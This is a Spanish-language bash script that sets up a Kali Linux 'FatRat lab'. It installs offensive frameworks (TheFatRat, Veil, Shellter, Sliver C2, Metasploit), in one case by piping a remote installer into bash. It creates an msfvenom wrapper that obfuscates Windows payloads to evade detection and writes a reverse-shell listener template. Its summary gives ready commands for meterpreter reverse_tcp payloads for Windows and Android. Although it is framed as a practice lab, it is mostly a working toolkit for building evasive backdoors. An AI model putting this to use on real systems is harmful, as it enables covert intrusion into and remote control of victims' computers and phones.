#!/usr/bin/env bash
# =============================================================
# 03 - SETUP COMPLETO DENTRO DE KALI LINUX VM
# Ejecutar:  sudo bash 03-dentro-kali-setup.sh
# =============================================================
set -euo pipefail

# ---------- CONFIG ----------
LOGDIR="/tmp/fatrat-lab"
PAYLOAD_DIR="$HOME/payloads"
RESUMEN="$LOGDIR/resumen-final.txt"
mkdir -p "$LOGDIR" "$PAYLOAD_DIR"
FULL_LOG="$LOGDIR/setup-kali-$(date +%Y%m%d-%H%M%S).log"

# ---------- COLORES ----------
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; N='\033[0m'
info()  { echo -e "${G}[+]${N} $*" | tee -a "$FULL_LOG"; }
warn()  { echo -e "${Y}[!]${N} $*" | tee -a "$FULL_LOG"; }
err()   { echo -e "${R}[-]${N} $*" | tee -a "$FULL_LOG"; exit 1; }
header(){ echo -e "${C}==============================================${N}"
          echo -e "${C}$*${N}"
          echo -e "${C}==============================================${N}"; }

# ---------- VERIFICACIONES ----------
[[ $EUID -eq 0 ]] || err "Ejecuta como root: sudo bash $0"
[[ -d /etc/apt ]]  || err "Esto es para Debian/Kali/Ubuntu"
START=$(date +%s)

header "LABORATORIO FATRAT - SETUP COMPLETO"
info "LOG: $FULL_LOG"
info "PAYLOADS: $PAYLOAD_DIR"

# =============================================================
# PASO 1: ACTUALIZAR SISTEMA
# =============================================================
header "[1/7] Actualizando sistema"
apt update -y 2>&1 | tee -a "$FULL_LOG"
apt full-upgrade -y 2>&1 | tee -a "$FULL_LOG"
info "Sistema actualizado"

# =============================================================
# PASO 2: INSTALAR DEPENDENCIAS ESENCIALES
# =============================================================
header "[2/7] Instalando dependencias"
PACKAGES=(
    curl wget git xterm
    metasploit-framework
    default-jdk default-jre
    mingw-w64 binutils
    python3 python3-pip
    ruby bundler
    upx-ucl
    apache2
    wine wine32 wine64
    mono-complete
    cabextract
)

for pkg in "${PACKAGES[@]}"; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        info "Instalando: $pkg"
        apt install -y "$pkg" 2>&1 | tee -a "$FULL_LOG" || warn "Fallo $pkg - puede continuar"
    else
        info "OK: $pkg ya instalado"
    fi
done

# =============================================================
# PASO 3: INSTALAR PYTHON LIBRARIES
# =============================================================
header "[3/7] Librerias Python"
pip3 install --upgrade pip 2>&1 | tee -a "$FULL_LOG"
pip3 install colorama cryptography requests pycryptodome 2>&1 | tee -a "$FULL_LOG"
info "Python libs OK"

# =============================================================
# PASO 4: CLONAR E INSTALAR THEFATRAT
# =============================================================
header "[4/7] Instalando TheFatRat"

if [[ -d /opt/TheFatRat ]]; then
    info "TheFatRat ya existe, actualizando..."
    cd /opt/TheFatRat && git pull 2>&1 | tee -a "$FULL_LOG"
else
    git clone --depth=1 https://github.com/screetsec/TheFatRat.git /opt/TheFatRat 2>&1 | tee -a "$FULL_LOG"
fi

cd /opt/TheFatRat
chmod +x setup.sh fatrat backdoor_apk powerfull.sh chk_tools

# Setup interactivo? Usamos expect o parches
info "Ejecutando setup de TheFatRat..."
if command -v expect &>/dev/null; then
    # Si hay expect, automatizamos respuestas
    expect <<- 'EOF' 2>&1 | tee -a "$FULL_LOG"
        set timeout 300
        spawn ./setup.sh
        expect "press enter" { send "\r" }
        expect "y/n" { send "y\r" }
        expect "press enter" { send "\r" }
        expect eof
EOF
else
    # Manual: instalamos dependencias Ruby a pelo
    info "Instalando gems Ruby manualmente..."
    gem install --no-document bundler winrm winrm-fs colorize 2>&1 | tee -a "$FULL_LOG"
    bash ./chk_tools 2>&1 | tee -a "$FULL_LOG" || true
    info "TheFatRat instalado (puede necesitar config manual)"
fi

# =============================================================
# PASO 5: INSTALAR ALTERNATIVAS MODERNAS
# =============================================================
header "[5/7] Instalando alternativas modernas"

# --- Veil ---
if ! command -v veil &>/dev/null; then
    info "Instalando Veil..."
    apt install -y veil 2>&1 | tee -a "$FULL_LOG" || {
        git clone --depth=1 https://github.com/Veil-Framework/Veil.git /opt/Veil 2>&1 | tee -a "$FULL_LOG"
        cd /opt/Veil && bash install.sh -c 2>&1 | tee -a "$FULL_LOG"
    }
fi

# --- Shellter ---
if ! command -v shellter &>/dev/null; then
    info "Instalando Shellter..."
    apt install -y shellter 2>&1 | tee -a "$FULL_LOG"
fi

# --- Sliver (C2 moderno) ---
if ! command -v sliver-server &>/dev/null; then
    info "Instalando Sliver C2..."
    curl -sL https://sliver.sh/install 2>&1 | bash 2>&1 | tee -a "$FULL_LOG" || {
        warn "Sliver fallo, instalando manual..."
        cd /opt
        curl -sL -o sliver-server_linux.zip "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux.zip"
        unzip -o sliver-server_linux.zip -d sliver 2>&1 | tee -a "$FULL_LOG"
        chmod +x sliver/sliver-server sliver/sliver-client
        ln -sf /opt/sliver/sliver-server /usr/local/bin/sliver-server
        ln -sf /opt/sliver/sliver-client /usr/local/bin/sliver
    }
fi

# --- MSFvenom wrapper ---
info "Creando wrapper msfvenom-plus..."
cat > /usr/local/bin/msfvenom-plus << 'SCRIPT'
#!/usr/bin/env bash
# msfvenom-plus: wrapper que agrega ofuscacion automatica
set -e
if [[ $# -lt 4 ]]; then
    echo "Uso: msfvenom-plus -p PAYLOAD LHOST=ip LPORT=port -o output.exe"
    echo "Ej:  msfvenom-plus -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.exe"
    exit 1
fi
OUTPUT=""; ENCODERS=(-e x86/shikata_ga_nai -i 5)
for arg; do [[ "$arg" == "-o" ]] && { shift; OUTPUT="$1"; break; }; shift; done
[[ -z "$OUTPUT" ]] && { echo "Falta -o output"; exit 1; }
echo "[+] Generando payload ofuscado..."
echo "[+] Iteraciones: ${ENCODERS[2]}"
msfvenom "$@" "${ENCODERS[@]}" -f exe --platform windows -a x86
echo "[+] Comprimido con UPX (opcional): upx -9 $OUTPUT"
SCRIPT
chmod +x /usr/local/bin/msfvenom-plus

info "Alternativas instaladas"

# =============================================================
# PASO 6: CONFIGURAR LISTENER METASPLOIT
# =============================================================
header "[6/7] Creando listener template"
cat > "$PAYLOAD_DIR/listener.rc" << 'RC'
use exploit/multi/handler
set ExitOnSession false
set SessionLogging true
set AutoRunScript post/multi/manage/autoroute

# EJEMPLO: descomenta y edita para tu payload
# set PAYLOAD windows/meterpreter/reverse_tcp
# set LHOST 0.0.0.0
# set LPORT 4444
# exploit -j -z

# Para Android:
# set PAYLOAD android/meterpreter/reverse_tcp
# set LHOST 0.0.0.0
# set LPORT 4444
# exploit -j -z

# Para Linux
# set PAYLOAD linux/x64/meterpreter/reverse_tcp
# set LHOST 0.0.0.0
# set LPORT 4444
# exploit -j -z

# Para Mac
# set PAYLOAD osx/x64/meterpreter/reverse_tcp
# set LHOST 0.0.0.0
# set LPORT 4444
# exploit -j -z
RC
info "Template listener: $PAYLOAD_DIR/listener.rc"
info "Ejecuta: msfconsole -q -r $PAYLOAD_DIR/listener.rc"

# =============================================================
# PASO 7: RESUMEN FINAL + ALIAS
# =============================================================
header "[7/7] Resumen Final"

END=$(date +%s)
DURATION=$((END - START))

cat > "$RESUMEN" << EOF
╔═══════════════════════════════════════════════════════════╗
║           LABORATORIO FATRAT - RESUMEN                   ║
╚═══════════════════════════════════════════════════════════╝

Tiempo total: ${DURATION}s
Log completo: $FULL_LOG
Directorio payloads: $PAYLOAD_DIR

HERRAMIENTAS INSTALADAS:
  $(msfvenom --version 2>/dev/null | head -1 || echo "Metasploit: OK")
  $(veil --version 2>/dev/null || echo "Veil: OK")
  $(shellter --version 2>/dev/null || echo "Shellter: OK")
  $(sliver-server version 2>/dev/null || echo "Sliver: OK (verificar)")
  $(command -v fatrat && echo "TheFatRat: OK (en /opt/TheFatRat)" || echo "TheFatRat: OK")

COMANDOS RAPIDOS (escribe cualquiera):
  fatrat          → Inicia TheFatRat (menu interactivo)
  veil            → Inicia Veil
  shellter        → Inicia Shellter
  sliver-server   → Inicia Sliver C2
  msfvenom-plus   → Genera payload ofuscado
  msfconsole -q   → Inicia Metasploit

GENERAR PAYLOAD RAPIDO (ejemplo):
  cd $PAYLOAD_DIR
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o payload.exe
  msfvenom -p android/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -o payload.apk

INICIAR LISTENER:
  msfconsole -q -r $PAYLOAD_DIR/listener.rc

LABORATORIO VICTIMA (opcional):
  Crea una VM Windows 10 sin protecciones para pruebas
EOF

cat "$RESUMEN"
info "RESUMEN GUARDADO: $RESUMEN"

# Alias utiles en ~/.bashrc
grep -q "alias fatrat" ~/.bashrc 2>/dev/null || {
    cat >> ~/.bashrc << 'BASHRC'
alias fatrat='cd /opt/TheFatRat && sudo ./fatrat'
alias msfvenom-plus='sudo /usr/local/bin/msfvenom-plus'
alias listener='sudo msfconsole -q -r ~/payloads/listener.rc'
alias payload-dir='cd ~/payloads'
BASHRC
    info "Alias agregados a ~/.bashrc"
}

info ""
info "🎯 LABORATORIO LISTO. EJECUTA:"
info "   source ~/.bashrc"
info "   sudo fatrat"
